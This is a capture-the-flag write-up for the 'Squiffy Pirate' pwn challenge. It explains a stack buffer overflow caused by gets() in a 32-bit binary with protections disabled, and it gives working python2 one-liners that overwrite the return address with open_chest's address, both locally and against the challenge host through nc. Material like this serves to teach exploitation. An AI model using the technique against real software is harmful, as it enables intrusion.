# Squiffy Pirate
>Author: Nic#4234

This is meant to be a very simple pwn challenge with all protections disabled.

We can check the binary and its protections with `file` and `checksec`:
```sh
$ file squiffy-pirate
squiffy-pirate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=b3819600171dc3571489f279d68a3c32ff43692b, for GNU/Linux 3.2.0, not stripped

$ checksec squiffy-pirate
[*] '~/squiffy-pirate'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

To solve this challenge, simply overflow the [buffer](insert-link-here) by sending 32 arbitrary bytes followed by the address of the function `open_chest` represented in Little Endian (LSB), which will overwrite the programs return instruction pointer (EIP, since this is a 32-bit executable). The address can be found by running `$ nm squiffy-pirate | grep chest` -> `080491b2`)

This is possible since the program is using the vulnerable function `gets()` which attempts to store everything we input into the specified buffer, without checking the size of the buffer. This allows program internals to be overwritten:

```sh
# Local:
python2 -c 'print "A" * 32 + "\xb2\x91\x04\x08"' | ./squiffy-pirate

# Remote:
python2 -c 'print "A" * 32 + "\xb2\x91\x04\x08"' | nc squiffypirate.tghack.no 1337
```

Alternatively the challenge can be solved with pwntools (see `exploit.py`).

Congratulations! You solved the challenge.
